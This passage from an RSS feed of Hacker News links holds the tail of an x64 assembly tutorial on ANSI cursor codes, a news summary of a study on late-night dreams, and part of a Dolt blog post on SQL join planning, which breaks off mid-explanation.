    <span>.ws_xpixel</span>  <span>dw</span> <span>?</span>     <span>; horizontal size, pixels</span>
    <span>.ws_ypixel</span>  <span>dw</span> <span>?</span>     <span>; vertical size, pixels</span>
<span>ends</span></code></pre></div>

<ul>
<li>Creating the initial cursor we will use as starting point to write our message. Basically we divide the screen rows and columns by <code>3</code> in order to get a nice centralized final output. Feel free to play around with this denominator for different results. The function below will construct the <code>ESC[x;yH</code> string into <code>cursor_buffer</code> and replace <code>x</code> and <code>y</code> with the result of our small division, rounding up if needed</li>
</ul>

<div><pre><code data-lang="nasm"><span>create_cursor:</span>
    <span>lea</span> <span>rdi</span><span>,</span> <span>[</span><span>cursor_buffer</span><span>]</span>   <span>; loading [cursor_buffer] into rdi</span>
    <span>mov</span> <span>byte</span> <span>[</span><span>rdi</span><span>],</span> <span>ES</span><span>C</span>        <span>; the 'ESC' character</span>
    <span>inc</span> <span>rdi</span>                    <span>; advance [cursor_buffer]</span>
    <span>mov</span> <span>byte</span> <span>[</span><span>rdi</span><span>],</span> <span>0x5b</span>       <span>; the '[' character</span>
    <span>inc</span> <span>rdi</span>                    <span>; advance [cursor_buffer]</span>

    <span>mov</span> <span>rcx</span><span>,</span> <span>3</span>                 <span>; loading denominator into rax</span>
    <span>mov</span> <span>r8w</span><span>,</span> <span>[</span><span>winsz.ws_row</span><span>]</span>    <span>; loading numerator (X axis = rows) into r8w</span>
    <span>call</span> <span>di</span><span>videRoundUp</span>         <span>; dividing r8w/rcx with result in rax</span>

    <span>cmp</span> <span>ax</span><span>,</span> <span>[</span><span>previous_axisX</span><span>]</span>   <span>; comparing X axis with previous X axis (zero during the first run)</span>
    <span>je</span> <span>.bad_axisX</span>              <span>; if current X axis = previous X axis, we should recalculate it</span>
    <span>jg</span> <span>.all_good</span>               <span>; else, we continue normally</span>
    <span>.bad_axisX:</span>                         
        <span>inc</span> <span>[</span><span>winsz.ws_row</span><span>]</span>     <span>; increasing current X axis as its the same as previous one (same cursor position not allowed)             </span>
        <span>jmp</span> <span>create_cursor</span>      <span>; recreating cursor ANSI escape code with proper coordinates</span>
    <span>.all_good:</span>
    <span>mov</span> <span>[</span><span>previous_axisX</span><span>],</span> <span>ax</span>   <span>; save X axis after dividing and rounding up into [previous_axisX]</span>

    <span>mov</span> <span>rdx</span><span>,</span> <span>rax</span>               <span>; loading X axis into rdx</span>
    <span>call</span> <span>convertStoreAxis</span>      <span>; converting X axis to ascii and storing in rdi (at current buffer position)</span>

    <span>mov</span> <span>byte</span> <span>[</span><span>rdi</span><span>],</span> <span>0x3b</span>       <span>; the ';' character </span>
    <span>inc</span> <span>rdi</span>                    <span>; advance [cursor_buffer]</span>

    <span>mov</span> <span>rcx</span><span>,</span> <span>3</span>                 <span>; loading denominator into rax</span>
    <span>mov</span> <span>r8w</span><span>,</span> <span>[</span><span>winsz.ws_col</span><span>]</span>    <span>; loading numerator (columns) into r8w</span>
    <span>call</span> <span>di</span><span>videRoundUp</span>         <span>; dividing r8w/rcx with result in rax</span>
    
    <span>mov</span> <span>rdx</span><span>,</span> <span>rax</span>               <span>; loading Y axis into rdx</span>
    <span>call</span> <span>convertStoreAxis</span>      <span>; converting Y axis to ascii and storing in rdi (at current buffer position)</span>

    <span>mov</span> <span>byte</span> <span>[</span><span>rdi</span><span>],</span> <span>0x48</span>       <span>; the 'H' character</span>

    <span>lea</span> <span>rdi</span><span>,</span> <span>[</span><span>cursor_buffer</span><span>]</span>   <span>; loading rdi with ANSI code that moves cursor ("ESC[x;yH")</span>
    <span>call</span> <span>strLen</span>                <span>; calculating code lenght from [cursor_buffer], result in rax</span>
    <span>ret</span></code></pre></div>

<ul>
<li>Now that we have the calculated <code>cursor_buffer</code>, we need to write it to <code>STDOUT</code>, which will move our cursor to the desired coordinates</li>
</ul>

<div><pre><code data-lang="nasm">    <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>cursor_buffer</span><span>]</span>   <span>; loading rsi with ANSI code that moves cursor</span>
    <span>mov</span> <span>rdx</span><span>,</span> <span>rax</span>               <span>; loading rdx with proper code length (without trailing null character)</span>
    <span>mov</span> <span>rdi</span><span>,</span> <span>STDOUT</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_WRITE</span>         <span>; in this program, the cursor will be set to the center of the screen</span>
    <span>syscall</span>                    <span>; moving cursor to (x, y)</span></code></pre></div>

<ul>
<li>What’s left now is to actually write our message to the screen, remember we are using <code>nanosleep</code> syscall to add some delay achieve a typewriter effect, so we will loop through our message byte by byte and write each byte to <code>STDOUT</code>. We also have to keep generating cursors with new <code>(x, y)</code> coordinates to move the input position around like a typewriter would (we can use <code>create_cursor</code> function again for that).</li>
</ul>

<div><pre><code data-lang="nasm"><span>struc</span><span>t</span> <span>TIMESPEC</span>
    <span>.tv_sec</span>     <span>dq</span> <span>0</span>            <span>; seconds to sleep</span>
    <span>.tv_nsec</span>    <span>dq</span> <span>060000000</span>    <span>; nanoseconds to sleep</span>
<span>ends</span></code></pre></div>

<div><pre><code data-lang="nasm"><span>.outputLoop:</span>
    <span>push</span> <span>rcx</span>                     <span>; saving msg_size in stack because syscall overwrites it</span>

    <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>msg</span> <span>+</span> <span>rbx</span><span>]</span>         <span>; loading rsi with msg[rbx] character</span>
    <span>mov</span> <span>rdx</span><span>,</span> <span>1</span>                   <span>; length (rdx) is 1 since we are outputting a single byte at a time</span>
    <span>mov</span> <span>rdi</span><span>,</span> <span>STDOUT</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_WRITE</span>
    <span>syscall</span>                      <span>; prints msg[rbx] to STDOUT</span>

    <span>cmp</span> <span>byte</span> <span>[</span><span>rsi</span><span>],</span> <span>0xa</span>          <span>; checking if current character is new line (\n)</span>
    <span>jne</span> <span>.continue</span>                <span>; if not, skip .moveCursor and continue</span>
    <span>.moveCursor:</span>
        <span>inc</span> <span>[</span><span>winsz.ws_row</span><span>]</span>       <span>; incrementing X axis to account for new line</span>
        <span>call</span> <span>create_cursor</span>       <span>; creating new ANSI code to move cursor to new coordinates</span>

        <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>cursor_buffer</span><span>]</span> <span>; loading rsi with ANSI code that moves cursor</span>
        <span>mov</span> <span>rdx</span><span>,</span> <span>rax</span>             <span>; loading rdx with proper code length (without trailing null character)</span>
        <span>mov</span> <span>rdi</span><span>,</span> <span>STDOUT</span>
        <span>mov</span> <span>r…</span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.guitmz.com/having-fun-with-ansi-codes-and-x64-linux-assembly/">https://www.guitmz.com/having-fun-with-ansi-codes-and-x64-linux-assembly/</a></em></p>]]>
            </description>
            <link>https://www.guitmz.com/having-fun-with-ansi-codes-and-x64-linux-assembly/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561350</guid>
            <pubDate>Mon, 28 Dec 2020 17:55:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Study: The later it is at night, the more likely we are to have weird dreams]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25561331">thread link</a>) | @Bologo
<br/>
December 28, 2020 | https://www.psychnewsdaily.com/study-finds-that-we-have-more-weird-dreams-as-the-night-progresses/ | <a href="https://web.archive.org/web/*/https://www.psychnewsdaily.com/study-finds-that-we-have-more-weird-dreams-as-the-night-progresses/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-5816" role="main">
<div>
<div>
<div>
<p>A <a href="https://www.sciencedirect.com/science/article/pii/S1053810020305389" target="_blank" rel="noreferrer noopener">new study</a> has found that the later it is, the more likely people are to have weird dreams.<span data-ez-name="psychnewsdaily_com-medrectangle-3"></span></p>
<p>The study adds to the <a href="https://amzn.to/2Kx7WKB" target="_blank" rel="noreferrer noopener">growing body of academic research on dreams</a>, a burgeoning field also known as <a href="https://en.wikipedia.org/wiki/Oneirology" target="_blank" rel="noreferrer noopener">oneirology</a>.</p>
<p>The study appeared on December 25 in the journal <em><a href="https://www.journals.elsevier.com/consciousness-and-cognition/" target="_blank" rel="noreferrer noopener">Consciousness and Cognition</a></em>. It was based on 68 students (58 of whom were female) at two universities in the United Kingdom. Their average age was 25. </p>
<h2>From crazy dreams to creepy dreams, and everything in between</h2>
<p>On two non-consecutive nights, a pre-programmed alarm clock woke the participants up four times throughout the night, at two-hour intervals. Upon each waking, they spoke into a digital audio device to record the contents any dream they might have been having. </p>
<p>The next morning, they listened to their recordings and completed a form that contained questions about each dream. The questions asked, for example, how bizarre the dream was on a scale of one to nine, how intense it was, how related the dream was to the dreamer’s waking life (past, present, or future), what emotions it conjured up, etc.<span data-ez-name="psychnewsdaily_com-medrectangle-4"></span></p>
<p>The average number of dreams that each participant recorded across the eight “awakenings” was about five.</p>
<p>The researchers, Josie Malinowski and Caroline Horton, grouped these dreams into two categories. The first consisted of “early night” dreams, consisting of dreams recorded after the two-hour and four-hour awakenings (in other words, dreams that took place during the first four hours of sleep). The second category consisted of “late night” dreams, recorded after the six-hour and eight-hour awakenings (i.e., during the second four hours of sleep). This categorization resulted in 173 early-night dreams and 177 late-night dreams.</p>
<h2>The wee hours are rife with weird dreams</h2>
<p>The results showed that late-night dreams were rated as substantially more bizarre and more metaphorical than early-night dreams. The participants also considered their late-night dreams more emotional, more intense, and more “important” than early-night dreams. Likewise, the late-night dreams were more likely to involve the distant past.</p>
<p>In contrast, the participants reported that their early-night dreams were more related to their waking life than the late-night dreams. The researchers found no differences between late-night and early-night dreams in terms of their stressfulness or negative valence.<span data-ez-name="psychnewsdaily_com-box-4"></span></p>
<p>The study also included several examples that the researchers say typify the early-night or late-night dreams of this sample group. One early-night dream, for example, was about the dreamer going on a shopping spree in a mall. In contrast, a typical late-night dream involved an exam session that morphed into a party with the party-goers clad in Victorian clothes, and where time itself was dancing.</p>
<h2>Bizarre dream images, new dream theories</h2>
<p>The fact that “dream-like” cognition increases in step with the amount of time spent asleep reflects “the change towards fluid, creative, and hyperassociative cognitive processes that underlie sleep towards the latter part of the night,” the researchers write.</p>
<p>And these differences in dream content may also relate to different sleep-related processes. The activation of memories during sleep, for example, <a href="https://www.frontiersin.org/articles/10.3389/fpsyg.2015.00874/full" target="_blank" rel="noreferrer noopener">probably has to do with memory consolidation</a>. Knowing more about how dream content changes over the course of the night “can provide insights into the nature of these processes of memory activation,” the authors write.</p>
<p>“Taken together, the increase in bizarreness, metaphoricity, and time orientation variance of late-night dreams show several ways in which late-night sleep cognition tends to be more fluid, creative, and associative than early-night dreams,” the study proposes.</p>
<p>Of course, this study reflects the dreams of a relatively small group of mostly young women based at British universities. As such, a broader sample pool might lead to different findings.</p>
<h2>“I have such funny dreams…” </h2>
<p>Likewise, the study is based entirely on the participants’ self-reports, in line with other <a href="https://www.psychnewsdaily.com/how-sharing-your-dreams-could-help-to-improve-your-relationships/" target="_blank" rel="noreferrer noopener">dream research</a>. But the researchers maintain that self-rating is the most appropriate method for determining the “bizarreness” of a dream. That is <a href="https://www.semanticscholar.org/paper/The-Problem-of-Dream-Content-Analysis-Validity-as-a-Schredl/34a69af866262c4514ecddf2ca2a72c5b6c451c2" target="_blank" rel="noreferrer noopener">because past research has found</a> that “external raters underestimate the amount of bizarreness in a dream in comparison to dreamers’ own ratings.” This finding can be confirmed by anyone who has ever listened to a description of someone else’s ostensibly weird dreams.</p>
<p>But the fact that someone describes a given dream as weird is fully understandable. The “intense (hyper)connectivity” of some dreams, the study writes, “may bring together memories, thoughts, and experiences from seemingly unrelated components of the dreamer’s life.”</p>
<p>The authors suggest future research could investigate whether people with more bizarre dreams also score higher on creativity measurements.</p>
<hr>
<p><strong>Study:</strong> “<a href="https://www.sciencedirect.com/science/article/abs/pii/S1053810020305389?via%3Dihub" target="_blank" rel="noreferrer noopener">Dreams reflect nocturnal cognitive processes: Early-night dreams are more continuous with waking life, and late-night dreams are more emotional and hyperassociative</a>“<br><strong>Authors:</strong> J.E. Malinowski and C.L. Horton<br><strong>Published in: </strong><em><a href="https://www.journals.elsevier.com/consciousness-and-cognition/" target="_blank" rel="noreferrer noopener">Consciousness and Cognition</a></em><br><strong>Publication date: </strong>December 25, 2020<br><strong>DOI:</strong> <a href="https://doi.org/10.1016/j.concog.2020.103071" target="_blank" rel="noreferrer noopener">https://doi.org/10.1016/j.concog.2020.103071<br></a><strong>Image: </strong>by&nbsp;<a href="https://pixabay.com/users/4144132-4144132/?utm_source=link-attribution&amp;utm_medium=referral&amp;utm_campaign=image&amp;utm_content=1959110">4144132</a>&nbsp;via&nbsp;<a href="https://pixabay.com/?utm_source=link-attribution&amp;utm_medium=referral&amp;utm_campaign=image&amp;utm_content=1959110">Pixabay</a>&nbsp;</p>
<p>For a weekly summary of the latest psychology research and psychology news, subscribe to our <a href="https://psychnewsweekly.substack.com/p/coming-soon?r=3s6yi&amp;utm_campaign=post&amp;utm_medium=email&amp;utm_source=copy" target="_blank" rel="noreferrer noopener">Psych News Weekly newsletter</a>.</p>
</div>
</div>
</div>
</article></div>]]>
            </description>
            <link>https://www.psychnewsdaily.com/study-finds-that-we-have-more-weird-dreams-as-the-night-progresses/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561331</guid>
            <pubDate>Mon, 28 Dec 2020 17:54:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing join planning in our open source Golang SQL query engine]]>
            </title>
            <description>
<![CDATA[
Score 97 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25561173">thread link</a>) | @zachmu
<br/>
December 28, 2020 | https://www.dolthub.com/blog/2020-12-28-join-planning/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2020-12-28-join-planning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text">
<p><a href="https://github.com/dolthub/dolt/">Dolt</a> is Git for Data. It's a SQL
database that you can clone, fork, branch, and merge. Dolt's SQL
engine is
<a href="https://github.com/dolthub/go-mysql-server/">go-mysql-server</a>, and
today we're going to discuss how it implements join planning to make a
query plan involving multiple tables as efficient as possible.</p>

<p>When a query involves more than one table, there are many different
ways to access those tables to get a correct result. But some ways are
much faster than others! Choosing an order to access tables in and a
strategy to assemble result rows is known as join planning. This is
easiest to explain with an example.</p>
<p>Let's create three tables to track the populations of cities and
states, and the people who live in them. If you have Dolt installed
(link in the sidebar), you can follow along.</p>
<div data-language="sql"><pre><code><span>%</span> mkdir <span>join</span><span>-</span>planning <span>&amp;&amp;</span> cd <span>join</span><span>-</span>planning
<span>%</span> dolt init
Successfully initialized dolt <span>data</span> repository<span>.</span>
<span>%</span> dolt <span>sql</span>



join_planning<span>&gt;</span> <span>create</span> <span>table</span> states <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> population <span>int</span> <span>unsigned</span><span>)</span><span>;</span>
join_planning<span>&gt;</span> <span>create</span> <span>table</span> cities <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> state <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>not</span> <span>null</span><span>,</span> population <span>int</span> <span>unsigned</span><span>)</span><span>;</span>
join_planning<span>&gt;</span> <span>create</span> <span>table</span> people <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> city <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>not</span> <span>null</span><span>)</span><span>;</span></code></pre></div>
<p>Let's say that we want a list of people named "John Smith" along with
names and populations of the cities and states they live in. We would
write a query like this:</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> people p 
    <span>join</span> cities c <span>on</span> p<span>.</span>city <span>=</span> c<span>.</span>name 
    <span>join</span> states s <span>on</span> s<span>.</span>name <span>=</span> c<span>.</span>state 
    <span>where</span> p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>;</span></code></pre></div>
<p>There's lots of ways that a query planner could execute this query. A
really bad way would be to look at every combination of every row from
all three tables and test each combination to see if it matches the
<code>JOIN</code> condition and <code>WHERE</code> clause. This is correct and valid, but
very expensive. If we say that the <code>states</code>, <code>cities</code> and <code>people</code>
tables contain <code>S</code>, <code>C</code> and <code>P</code> rows respectively, this query plan
(which is called a cross join), will result in <code>S * C * P</code> row
accesses and comparisons. It's a bad idea. </p>
<p>There are simple tricks you can use to speed up query execution. Using
<a href="https://www.dolthub.com/blog/2020-10-28-pushdown-filters/">pushdown
optimization</a>,
you can eliminate most of the accesses to the <code>people</code> table. Let's
say that the number of "John Smiths" in the database is called <code>J</code>,
and it's much smaller than <code>P</code>. Then using pushdown intelligently
reduces the cost of our access to <code>S * C * J</code>.</p>
<p>Until a few weeks ago, this was as good as
<a href="https://github.com/dolthub/dolt/">Dolt</a> could do on joins of three or
more tables. For two tables, we would use an index if available. But
for three, no luck. It made the product borderline unusable for a
workload with this query pattern and a non-trivial data size.</p>
<p>This blog post is about how we optimized the join planner to generate
more intelligent, efficient query plans for any number of tables. In
today's version of <a href="https://github.com/dolthub/dolt/">Dolt</a>, that same
query will generate the following query plan:</p>
<div data-language="sql"><pre><code>join_planning<span>&gt;</span> <span>explain</span> <span>select</span> <span>*</span> <span>from</span> people p 
    <span>join</span> cities c <span>on</span> p<span>.</span>city <span>=</span> c<span>.</span>name 
    <span>join</span> states s <span>on</span> s<span>.</span>name <span>=</span> c<span>.</span>state 
    <span>where</span> p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>;</span>
<span>+</span>
<span>|</span> <span>plan</span>                                                        <span>|</span>
<span>+</span>
<span>|</span> IndexedJoin<span>(</span>p<span>.</span>city <span>=</span> c<span>.</span>name<span>)</span>                                <span>|</span>
<span>|</span>  ├─ Filter<span>(</span>p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>)</span>                           <span>|</span>
<span>|</span>  │   └─ Projected <span>table</span> access <span>on</span> <span>[</span>name city<span>]</span>               <span>|</span>
<span>|</span>  │       └─ TableAlias<span>(</span>p<span>)</span>                                   <span>|</span>
<span>|</span>  │           └─ Indexed <span>table</span> access <span>on</span> <span>index</span> <span>[</span>people<span>.</span>name<span>]</span> <span>|</span>
<span>|</span>  │               └─ Exchange<span>(</span>parallelism<span>=</span><span>16</span><span>)</span>                <span>|</span>
<span>|</span>  │                   └─ <span>Table</span><span>(</span>people<span>)</span>                       <span>|</span>
<span>|</span>  └─ IndexedJoin<span>(</span>s<span>.</span>name <span>=</span> c<span>.</span>state<span>)</span>                           <span>|</span>
<span>|</span>      ├─ TableAlias<span>(</span>c<span>)</span>                                       <span>|</span>
<span>|</span>      │   └─ IndexedTableAccess<span>(</span>cities <span>on</span> <span>[</span>cities<span>.</span>name<span>]</span><span>)</span>     <span>|</span>
<span>|</span>      └─ TableAlias<span>(</span>s<span>)</span>                                       <span>|</span>
<span>|</span>          └─ IndexedTableAccess<span>(</span>states <span>on</span> <span>[</span>states<span>.</span>name<span>]</span><span>)</span>     <span>|</span>
<span>+</span></code></pre></div>
<p>The plan starts with an indexed access on the <code>name</code> column of
<code>people</code> to find all the John Smiths. Then for each row, it uses a
primary key index to look up the city. Then for each city, it uses
another primary key to look up the state. In all, this leads to a
total query cost of <code>J * 3</code>. </p>
<h2>Is that... a lot?</h2>
<p><img src="https://www.dolthub.com/blog/1e2adb7b32ddb47442f1c254bf2358ed/is-that-a-lot.gif" alt="Is that a lot?"></p>
<p>Using some real numbers to drive this home: let's use the US and say
that there are 330,000,000 <code>people</code> rows, 20,000 <code>cities</code> rows, and 52
<code>states</code> rows (we didn't forget you, DC and Puerto Rico). A cross join
query plan would access a number of rows equal to the product of these
numbers, which is roughly 343 trillion accesses. It's a big
number. Your query isn't going to complete.</p>
<p><a href="http://howmanyofme.com/#:~:text=The%20U.S.%20Census%20Bureau%20statistics,Smith%20in%20the%20United%20States.">There are about 48,000 people named John
Smith</a>
in the US. So using pushdown optimization gets us down to about 50
billion row accesses. This is a lot better than before, but still
terrible. The query isn't returning.</p>
<p>Using both pushdown to the <code>people</code> table and indexed accesses to
<code>cities</code> and <code>states</code>, on the other hand, limits the query execution
to only 48,000 accesses to the <code>people</code> table, then 1 access to each of
the <code>cities</code> and <code>states</code> table for each of these rows. That's <code>3 *
48,000</code>, or 144,000 table accesses total.</p>
<table>
<thead>
<tr>
<th>Join plan</th>
<th>Number of rows accessed</th>
</tr>
</thead>
<tbody>
<tr>
<td>Cross join</td>
<td>343 * 10^12</td>
</tr>
<tr>
<td>Cross join with pushdown</td>
<td>50 * 10^9</td>
</tr>
<tr>
<td>Pushdown and indexed access</td>
<td>144 * 10^3</td>
</tr>
</tbody>
</table>
<p>Unlike in the <a href="https://www.dolthub.com/blog/2020-10-28-pushdown-filters/">pushdown
blog</a>, I
won't bother to spell out the percentage savings. We're looking at 4
decimal orders of magnitude improvement for the first optimization,
then another 5 for the second. It's the difference between
<a href="https://github.com/dolthub/dolt/">Dolt</a> being a usable query engine
or a bad space heater.</p>

<p>To assemble an efficient query plan, you have to start by by answering
one really important question:</p>
<blockquote>
<p>What order should we access the tables in?</p>
</blockquote>
<p>This really makes all the difference. In the example above, a table
access order of <code>people &gt; cities &gt; states</code> lets us use the primary key
index on the latter two tables. If we instead chose the order <code>states &gt; cities &gt; people</code>,
we can't use the information from earlier tables
to reduce the number of lookups into later tables, giving us a cross join.</p>
<p>There are a lot of interesting details to get wrong, but to get table
order right you can use some pretty simple heuristics.</p>
<ol>
<li><strong>What index could I use</strong> to access this table? Are those columns part
of a join condition?</li>
<li><strong>Are required columns available to use as a key</strong>? Did the other tables
in the join condition precede this one?</li>
<li><strong>How many rows are in this table</strong> if I need to do a full table scan?</li>
<li><strong>Is this a <code>LEFT</code> or <code>RIGHT</code> join</strong>, and if so, is this table on the
side of the join that requires it to come first?</li>
</ol>
<p>We'll come back to the actual implementation of the table ordering
algorithm later. For now let's assume its existence, and it tells us
which order to access tables in. How do we build a join plan with that
access order?</p>

<p>In <a href="https://github.com/dolthub/go-mysql-server/">go-mysql-server</a>,
query plans are organized in a tree of <code>Node</code> objects. As of now, all
nodes have at most two children, making the query plan a binary-ish
tree. A <code>Join</code> node knows how to get a row from its left child, then
iterate over its right child looking for matches on the join
condition. When the right child iterator is out of rows, it gets the
next row from its left child. Eventually it runs out of rows in the
left child and returns <code>io.EOF</code> from its iterator.</p>
<p>Like everything else, this is easiest to visualize with some
examples. For all of these, we'll use one-letter table names with
single columns that match the table name. Here's a simple join between
two tables A and B:</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b<span>;</span></code></pre></div>
<p>A naive query plan looks like this:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/efc6e/simple-join.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="two table join" title="two table join" src="https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/efc6e/simple-join.png" srcset="https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/a48b3/simple-join.png 214w,
https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/47730/simple-join.png 428w,
https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/efc6e/simple-join.png 441w" sizes="(max-width: 441px) 100vw, 441px" loading="lazy">
  </a>
    </span></p>
<p>As we add additional tables to the join, they become the new root of
the tree, with the original subtree as the left child.</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b <span>join</span> C <span>on</span> b <span>=</span> c<span>;</span></code></pre></div>
<p><span>
      <a href="https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/508ef/three-table-join.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="three table join" title="three table join" src="https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/508ef/three-table-join.png" srcset="https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/a48b3/three-table-join.png 214w,
https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/47730/three-table-join.png 428w,
https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/508ef/three-table-join.png 578w" sizes="(max-width: 578px) 100vw, 578px" loading="lazy">
  </a>
    </span></p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b <span>join</span> C <span>on</span> b <span>=</span> c <span>join</span> D <span>on</span> c <span>=</span> d<span>;</span></code></pre></div>
<p><span>
      <a href="https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/01dae/four-table-join.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="four table join" title="four table join" src="https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/01dae/four-table-join.png" srcset="https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/a48b3/four-table-join.png 214w,
https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/47730/four-table-join.png 428w,
https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/01dae/four-table-join.png 721w" sizes="(max-width: 721px) 100vw, 721px" loading="lazy">
  </a>
    </span></p>
<p>Let's examine this last example more closely. What happens when we
open an iterator on the root <code>Node</code> of the query? It opens an iterator
on its left child, which in turn opens an iterator on its left child,
and so on. Each node, after accessing a row from its left child, then
attempts to find a matching row from its right child. We end up with
the table access order the same as in the lexical query: <code>A &gt; B &gt; C &gt;
D</code>. </p>
<p>Let's trace through the execution of a single row in the result set.</p>
<ol>
<li>The join node <code>a = b</code> gets a row from <code>A</code>. Then it iterates through
the rows of <code>B</code> looking for rows that match the join condition <code>a =
b</code>. When it finds such a row, it returns it.</li>
<li>The node <code>b = c</code> takes the row from its left child, which is a
concatenation of rows from tables <code>A</code> and <code>B</code>. It then iterates
over its right child, the rows of <code>C</code>, looking for rows that match
the join condition <code>b = c</code>. When it finds such a row, it returns
it.</li>
<li>The node <code>c = d</code> takes the row from its left child, which is a
concatenation of rows from <code>A</code> and <code>B</code> and <code>C</code>, in that order. It
then attempts to match rows from its right child, <code>D</code>, just as
above.</li>
</ol>
<p>Importantly, there are sometimes many possible binary trees that can
implement the above logic to yield a correct result for any given
table access order. The tree construction algorithm above, where we
keep shoving a sub-tree down to the left child of a new join node, is
just what the parser gives us by default because it's left
associative. But we can draw other trees that give the same
results. For example, here's a balanced join tree:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/d9217/four-table-balanced.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="balanced four table join" title="balanced four table join" src="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/ad12c/four-table-balanced.png" srcset="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/a48b3/four-table-balanced.png 214w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/47730/four-table-balanced.png 428w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/ad12c/four-table-balanced.png 856w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/d9217/four-table-balanced.png 904w" sizes="(max-width: 856px) 100vw, 856px" loading="lazy">
  </a>
    </span></p>
<p>Like the original, this produces a table access order of <code>A &gt; B &gt; C &gt;
D</code>. If we wanted to access the tables in the opposite order, we could
simply flip the left and right children of every node in the original
tree like so:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="reversed four table join" title="reversed four table join" src="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png" srcset="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/a48b3/four-table-reversed.png 214w,
https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/47730/four-table-reversed.png 428w,
https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png 717w" sizes="(max-width: 717px) 100vw, 717px" loading="lazy">
  </a>
    </span></p>
<p>Again, there are sometimes many possible join trees for a given table
ordering. But they all have one thing in common: their join conditions
refer to tables that can be found in their left and right
children. Otherwise, the node cannot evaluate its join condition. For
example, let's say that we are querying three tables and want to
access them in the order <code>B &gt; A &gt; C</code>. This is an invalid join plan
with that table ordering:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/065e2/three-table-invalid.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="invalid three table join" title="invalid three table join" src="https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/065e2/three-table-invalid.png" srcset="https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/a48b3/three-table-invalid.png 214w,
https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/47730/three-table-invalid.png 428w,
https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/065e2/three-table-invalid.png 577w" sizes="(max-width: 577px) 100vw, 577px" loading="lazy">
  </a></span></p></div></div>
